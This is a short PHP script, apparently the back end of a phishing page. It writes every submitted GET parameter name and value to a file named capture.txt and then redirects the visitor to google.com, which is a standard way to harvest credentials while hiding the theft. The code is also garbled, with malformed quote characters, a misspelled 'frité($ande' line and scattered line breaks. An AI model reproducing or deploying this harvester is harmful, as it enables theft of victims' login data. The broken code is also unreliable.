<?php
header(¨Location: https://www.google.com¨);
$handle =

fopen("capture.txt", "a"); 
foreach($_GET as

$variable => $value) {
fwrite($handle,

$variable);
fwrite($handle, "=");

fwrite($handle, $value);
fwrite($handle,

"\r\n");
}
frité($ande, "\r\n");
fclose($handle);
exit;
?>